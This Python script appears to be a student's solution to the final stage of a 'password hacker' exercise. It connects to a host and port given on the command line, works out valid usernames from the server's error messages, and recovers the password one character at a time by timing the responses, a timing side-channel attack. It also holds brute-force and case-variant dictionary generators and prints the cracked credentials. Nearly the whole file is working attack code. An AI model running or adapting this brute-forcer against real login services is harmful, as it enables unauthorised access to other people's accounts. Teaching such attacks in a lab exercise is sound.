# Stage 5/5: Time-based vulnerability

# Method 1: Using Command Line Arguments with sys module
import sys
import socket
import itertools
import string
import json
import time
args = sys.argv

# Creating the socket
hostname = args[1]
port = int(args[2])
address = (hostname, port)

def password_generator():
    '''Create a custom generator to create every single password combination from 1 to 36 characters in length\
    ['a to z' 26 lower characters] and ['0 to 9' 10 digits]'''
    characters = string.ascii_lowercase + string.digits

    for pass_len in range(1, len(characters)):
        for char in itertools.product(characters, repeat=pass_len):
            yield ''.join(char)

def dict_pass():
    with open("passwords.txt", "r") as file:
        for password in file.readlines():
            password = password.rstrip('\n')
            if password.isdigit():
                yield password
            else:
                password_combinations = list(zip(password, password.upper()))
                for combination in itertools.product(*password_combinations):
                    yield ''.join(combination)

def dict_logins():
    with open("logins.txt", "r") as logins:
        for login in logins.readlines():
            login = login.rstrip('\n')
            login_test = {"login": login, "password": " "}
            login_test = (json.dumps(login_test)).encode()
            client_socket.send(login_test)    # Sending through socket
            response = client_socket.recv(1024).decode()     # Receive server's response and decode from bytes to string
            response = json.loads(response)

            if response["result"] == "Wrong password!":
                return login

with socket.socket() as client_socket:
    client_socket.connect(address)    # Connect to host and a port using socket
    password = ''
    characters = string.ascii_uppercase + string.ascii_lowercase + string.digits
    login = dict_logins()

    while True:
        for letter in characters:
            credentials = {"login": login, "password": password + letter}

            credentials = json.dumps(credentials).encode()
            client_socket.send(credentials)    # Sending through socket

            start_time = time.perf_counter()
            response = client_socket.recv(1024)
            response = json.loads(response)

            end_time = time.perf_counter()
            if end_time - start_time >= 0.1:
                password += letter
                break
            elif response["result"] == "Connection success!":     
                print(credentials.decode())
                exit()
                break     

# Method 2: Using argparse module
# import argparse
# import socket
#
# parser = argparse.ArgumentParser()
# parser.add_argument('hostname')
# parser.add_argument('port')
# parser.add_argument('password')
# args = parser.parse_args()
# address = (args.hostname, int(args.port))
#
# with socket.socket() as client_socket:
#     client_socket.connect(address)
#     client_socket.send(args.password.encode())
#     response = client_socket.recv(1024).decode()
#     print(response)

